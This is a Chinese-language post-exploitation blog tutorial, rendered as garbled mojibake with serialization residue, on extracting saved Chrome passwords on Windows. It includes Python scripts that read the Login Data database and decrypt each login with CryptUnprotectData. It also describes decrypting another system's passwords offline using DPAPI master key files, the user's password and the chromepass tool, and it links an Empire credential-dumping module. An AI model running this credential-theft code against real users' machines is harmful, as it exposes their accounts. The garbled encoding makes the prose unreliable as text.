I"¿+<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨åæ¸—é€é˜¶æ®µï¼Œè·å¾—æƒé™åéœ€è¦æœé›†ç›®æ ‡ç³»ç»Ÿçš„ä¿¡æ¯ã€‚ä¿¡æ¯è¶Šå…¨é¢ï¼Œè¶Šæœ‰åŠ©äºè¿›ä¸€æ­¥çš„æ¸—é€ã€‚å¯¹äºWindowsç³»ç»Ÿï¼Œç”¨æˆ·æµè§ˆå™¨å¾€å¾€åŒ…å«æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p>

<p>åœ¨ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91">ã€Šæœ¬åœ°å¯†ç æŸ¥çœ‹å·¥å…·LaZagneä¸­çš„è‡ªå®šä¹‰è„šæœ¬å¼€å‘ã€‹</a>æ›¾ä»‹ç»è¿‡åˆ©ç”¨LaZagneå¯¼å‡ºå¤šä¸ªæµè§ˆå™¨å¯†ç çš„æ–¹æ³•ã€‚</p>

<p>æœ¬æ–‡å°†è¦é’ˆå¯¹Chromeæµè§ˆå™¨ï¼Œä»‹ç»å…·ä½“çš„å¯¼å‡ºåŸç†å’Œåˆ©ç”¨æ–¹æ³•ï¼Œè§£å†³ä¸€ä¸ªå®é™…é—®é¢˜ï¼š <code class="language-plaintext highlighter-rouge">å¦‚ä½•å¯¼å‡ºå¦ä¸€ç³»ç»Ÿä¸‹Chromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ï¼Ÿ</code></p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>Chromeæµè§ˆå™¨ä¿å­˜å¯†ç çš„æ–¹å¼</li>
  <li>å¦‚ä½•å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </li>
  <li>å¸¸ç”¨æ–¹æ³•çš„é™åˆ¶</li>
  <li>å¦‚ä½•å¯¼å‡ºå¦ä¸€ç³»ç»Ÿä¸‹Chromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </li>
</ul>

<h2 id="0x02-chromeæµè§ˆå™¨ä¿å­˜å¯†ç çš„æ–¹å¼">0x02 Chromeæµè§ˆå™¨ä¿å­˜å¯†ç çš„æ–¹å¼</h2>
<hr />

<p>æ­£å¸¸ç”¨æˆ·åœ¨è®¿é—®ç½‘ç«™æ—¶ï¼Œå¯é€‰æ‹©ä½¿ç”¨Chromeæµè§ˆå™¨ä¿å­˜ç™»å½•çš„ç”¨æˆ·å¯†ç ï¼Œç”¨äºä¸‹æ¬¡ç™»å½•çš„æ—¶å€™Chromeè‡ªåŠ¨å¡«å†™ç™»å½•å¯†ç ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/2-0.png" alt="Alt text" /></p>

<p>åœ¨Chromeä¸­å¯ä»¥æŸ¥çœ‹ä¿å­˜çš„ç™»å½•å¯†ç (éœ€è¦æä¾›ç”¨æˆ·å£ä»¤)ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/2-1.png" alt="Alt text" /></p>

<p>Chromeä¸­ä¿å­˜çš„å¯†ç å…ˆè¢«äºŒæ¬¡åŠ å¯†ï¼Œç„¶åè¢«ä¿å­˜åœ¨SQLiteæ•°æ®åº“æ–‡ä»¶ä¸­ï¼Œä½ç½®å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code></p>

<h3 id="å®é™…æµ‹è¯•">å®é™…æµ‹è¯•ï¼š</h3>

<p>æµ‹è¯•ç³»ç»Ÿï¼š Win7x86</p>

<p>Chromeç‰ˆæœ¬ï¼š 63.0.3239.132</p>

<p>å®šä½SQLiteæ•°æ®åº“æ–‡ä»¶ï¼Œä½äº<code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Local\Google\Chrome\User Data\Default\Login Data</code></p>

<p>ä½¿ç”¨å·¥å…·è¯»å–æ•°æ®åº“æ–‡ä»¶ï¼Œæµ‹è¯•å·¥å…·ï¼š SQLiteStudio</p>

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>https://sqlitestudio.pl/index.rvt</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>SQLiteStudioå¼€æºï¼Œç‰¹ç‚¹æ˜¯æ”¯æŒæŸ¥çœ‹åå…­è¿›åˆ¶æ•°æ®(SQLiteSpyä¸æ”¯æŒæŸ¥çœ‹åå…­è¿›åˆ¶æ•°æ®)</p>

<p>æˆåŠŸè¯»å–æ•°æ®åº“æ–‡ä»¶ä¿å­˜çš„ä¿¡æ¯ï¼Œä½†passwordæ®µæ— æ³•æ˜¾ç¤ºï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/2-2.png" alt="Alt text" /></p>

<p>é€‰æ‹©<code class="language-plaintext highlighter-rouge">Form view</code>ï¼ŒæŸ¥çœ‹åå…­è¿›åˆ¶æ ¼å¼ï¼Œè·å¾—äºŒæ¬¡åŠ å¯†åçš„ç”¨æˆ·å¯†ç ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/2-3.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¦‚æœChromeæ­£åœ¨è¿è¡Œï¼Œæ— æ³•ä½¿ç”¨SQLiteStudioæ‰“å¼€æ•°æ®åº“æ–‡ä»¶Login Dataï¼Œå¯å°†è¯¥æ–‡ä»¶å¤åˆ¶åå†æ‰“å¼€</p>

<h2 id="0x03-å¯¼å‡ºchromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ">0x03 å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </h2>
<hr />

<p>é¦–å…ˆï¼Œç¼–å†™ç¨‹åºå®ç°è¯»å–SQLiteæ•°æ®åº“æ–‡ä»¶ï¼Œè¿™é‡Œé€‰æ‹©ä½¿ç”¨pythonå®ç°</p>

<p>å¼€æºä»£ç å¾ˆå¤šï¼Œæ‰€ä»¥è¿™é‡Œåªç»™å‡ºä¸€ä¸ªç¤ºä¾‹</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
import sqlite3
import binascii
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    print (binascii.b2a_hex(result[2]))
</code></pre></div></div>

<p>è·å¾—äºŒæ¬¡åŠ å¯†çš„ç”¨æˆ·å¯†ç ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/3-1.png" alt="Alt text" /></p>

<p>å‚è€ƒChromiumå¼€æºä»£ç ï¼Œæ‰¾åˆ°ChromeåšäºŒæ¬¡åŠ å¯†çš„æ–¹æ³•ï¼š <strong>é€šè¿‡Windows API CryptProtectData()å®ç°</strong></p>

<p>å‚è€ƒåŠ å¯†ä»£ç ï¼š</p>

<p>https://github.com/scheib/chromium/blob/eb7e2441dd8878f733e43799ea77c2bab66816d3/chrome/browser/password_manager/password_store_win_unittest.cc#L107</p>

<p>CryptProtectData()çš„è¯´æ˜å¯å‚è€ƒï¼š</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx</p>

<p>è·å¾—å…³é”®ä¿¡æ¯ï¼š</p>

<h4 id="1å¯¹åº”è§£å¯†å‡½æ•°ä¸ºcryptunprotectdata">(1)å¯¹åº”è§£å¯†å‡½æ•°ä¸ºCryptUnprotectData</h4>

<p>å‚è€ƒåœ°å€ï¼š</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85).aspx</p>

<h4 id="2åªæœ‰ä¸åŠ å¯†æ•°æ®çš„ç”¨æˆ·å…·æœ‰ç›¸åŒç™»å½•å‡­æ®çš„ç”¨æˆ·æ‰èƒ½è§£å¯†æ•°æ®">(2)åªæœ‰ä¸åŠ å¯†æ•°æ®çš„ç”¨æˆ·å…·æœ‰ç›¸åŒç™»å½•å‡­æ®çš„ç”¨æˆ·æ‰èƒ½è§£å¯†æ•°æ®</h4>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåªèƒ½åœ¨å½“å‰ç”¨æˆ·çš„å‡­æ®ä¸‹è§£å¯†æ•°æ®</p>

<p>è§£å¯†çš„å¼€æºä»£ç ä¹Ÿæœ‰å¾ˆå¤šï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ªç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
import sqlite3
import win32crypt
import binascii
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    print password
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>è°ƒç”¨win32crypt.CryptUnprotectDataéœ€è¦å®‰è£…pywin32</p>

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/pywin32-219.win32-py2.7.exe</p>

<p>æ‰§è¡Œåï¼Œè¿˜åŸç”¨æˆ·å¯†ç ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/3-2.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¦‚æœChromeæ­£åœ¨è¿è¡Œï¼Œæ— æ³•æŸ¥è¯¢æ•°æ®åº“æ–‡ä»¶Login Dataï¼Œæ˜¾ç¤º<code class="language-plaintext highlighter-rouge">sqlite3.OperationalError: database is locked</code></p>

<p>ç»¼ä¸Šï¼Œåœ¨å®é™…å¯¼å‡ºçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœChromeæ­£åœ¨è¿è¡Œï¼Œéœ€è¦å…ˆå¤åˆ¶æ•°æ®åº“æ–‡ä»¶ï¼Œå†å°è¯•è§£å¯†</p>

<h2 id="0x04-å¦‚ä½•å¯¼å‡ºå¦ä¸€ç³»ç»Ÿä¸‹chromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ">0x04 å¦‚ä½•å¯¼å‡ºå¦ä¸€ç³»ç»Ÿä¸‹Chromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </h2>
<hr />

<p>å‚ç…§CryptProtectData()çš„è¯´æ˜ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx</p>

<blockquote>
  <p>â€œUsually, the only user who can decrypt the data is a user with the
same logon credentials as the user who encrypted the data.In addition,
the encryption and decryption must be done on the same computer. â€œ</p>
</blockquote>

<p>æ˜¯å¦å¯ä»¥æ–­å®šï¼Œæ— æ³•åœ¨å¦ä¸€ç³»ç»Ÿä¸‹å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç å‘¢ï¼Ÿ</p>

<p>ç­”æ¡ˆæ˜¯å¦å®šçš„</p>

<p>Chromeå¯†ç è¿˜åŸå·¥å…·chromepassæä¾›äº†ä¸€ä¸ªç‰¹åˆ«çš„åŠŸèƒ½ï¼š <code class="language-plaintext highlighter-rouge">Reading ChromePass passwords from external drive</code></p>

<p>chromepassä¸‹è½½åœ°å€ï¼š</p>

<p>http://www.nirsoft.net/utils/chromepass.html</p>

<p>è¯´æ˜å¦‚ä¸‹ï¼š</p>

<blockquote>
  <p>â€œyou can also read the passwords stored by Chrome Web browser from an
external profile in your current operating system or from another
external driveâ€</p>
</blockquote>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨chromepassèƒ½å¤Ÿå¯¼å‡ºå½“å‰ç³»ç»Ÿä¸‹å¦ä¸€ç”¨æˆ·çš„Chromeå¯†ç </p>

<p>æ“ä½œç•Œé¢å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/4-1.png" alt="Alt text" /></p>

<p>æ—¢ç„¶å¦‚æ­¤ï¼Œå¦‚æœè·å¾—äº†å¦ä¸€ç³»ç»Ÿä¸‹çš„ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œèƒ½å¦å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç å‘¢ï¼Ÿ</p>

<p>å½“ç„¶å¯ä»¥</p>

<p>è§£å¯†éœ€è¦è·å¾—ä¸‰éƒ¨åˆ†å†…å®¹ï¼š</p>

<ol>
  <li>åŠ å¯†å¯†é’¥(å³Master Keyæ–‡ä»¶)ï¼Œä½äº<code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Protect</code>ä¸‹å¯¹åº”sidæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶</li>
  <li>æ•°æ®åº“æ–‡ä»¶Login Data</li>
  <li>ç”¨æˆ·æ˜æ–‡çš„å¯†ç ï¼Œç”¨äºè§£å¯†åŠ å¯†å¯†é’¥</li>
</ol>

<p>ç”±äºchromepassç¨‹åºçš„è®¾è®¡é—®é¢˜ï¼Œä»¥ä¸Šæ–‡ä»¶éœ€è¦ç»„æˆç‰¹å®šæ ¼å¼ï¼Œå­ç›®å½•æ ¼å¼å¦‚ä¸‹ï¼š</p>

<ul>
  <li>
    <p>\AppData\Local\Google\Chrome\User Data\Default\Login Data</p>
  </li>
  <li>
    <p>\AppData\Roaming\Microsoft\Protect{sid}}\ä¸‹ä¿å­˜keyæ–‡ä»¶</p>
  </li>
</ul>

<p><strong>æ³¨ï¼š</strong></p>

<p>{sid}å¿…é¡»åŒåŸç³»ç»Ÿçš„å¯¹åº”</p>

<p>eg.</p>

<p><code class="language-plaintext highlighter-rouge">\AppData\Local\Google\Chrome\User Data\Default\Login Data</code></p>

<p><code class="language-plaintext highlighter-rouge">\AppData\Roaming\Microsoft\Protect\S-1-5-21-3453529135-4164765056-1075703908-1001\329c4147-0011-4ad6-829d-e32dcbd1bbd7</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/4-2.png" alt="Alt text" /></p>

<p>ä½¿ç”¨chromepassé€‰æ‹©è¯¥ç›®å½•ï¼Œå¡«å…¥ç”¨æˆ·æ˜æ–‡å¯†ç ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/4-3.png" alt="Alt text" /></p>

<p>æˆåŠŸè§£å¯†ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/4-4.png" alt="Alt text" /></p>

<p><strong>è¡¥å……ï¼š</strong></p>

<p>chromepassä¹Ÿå¯åœ¨å‘½ä»¤è¡Œä¸‹ä½¿ç”¨</p>

<h2 id="0x05-å¼€æºå·¥å…·">0x05 å¼€æºå·¥å…·</h2>
<hr />

<p>è§£å¯†å½“å‰ç³»ç»Ÿä¸‹Chromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ï¼Œå¯ä¾›å‚è€ƒçš„å·¥å…·ï¼š</p>

<ol>
  <li>å‘½ä»¤è¡Œå·¥å…·Chrome Password Dumpï¼Œä¸‹è½½åœ°å€ï¼š</li>
</ol>

<p>http://securityxploded.com/chrome-password-dump.php</p>

<ol>
  <li>powershellå®ç°çš„å·¥å…·ï¼š</li>
</ol>

<p>https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1</p>

<ol>
  <li>pythonå®ç°ä»£ç ï¼Œå¯ä¾›å‚è€ƒçš„å¼€æºä»£ç ï¼š</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
import sqlite3
import win32crypt
import binascii
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    if password:
        print 'Site: ' + result[0]
        print 'Username: ' + result[1]
        print 'Password: ' + password
    else:
        print "no password found"
</code></pre></div></div>

<h2 id="0x06-å°ç»“">0x06 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†å¯¼å‡ºChromeæµè§ˆå™¨å¯†ç çš„åŸç†å’Œåˆ©ç”¨æ–¹æ³•ï¼ŒæˆåŠŸè§£å†³ä¸€ä¸ªå®é™…é—®é¢˜ï¼š <code class="language-plaintext highlighter-rouge">é€šè¿‡åŠ å¯†å¯†é’¥æ–‡ä»¶å’Œç”¨æˆ·æ˜æ–‡å¯†ç ï¼Œèƒ½å¤Ÿå¯¼å‡ºå¦ä¸€ç³»ç»Ÿä¸‹Chromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </code></p>

<p>å¦‚æœåªè·å¾—äº†ç”¨æˆ·å¯†ç ntlm hashï¼Œèƒ½å¦å¯¼å‡ºå‘¢ï¼Ÿ</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET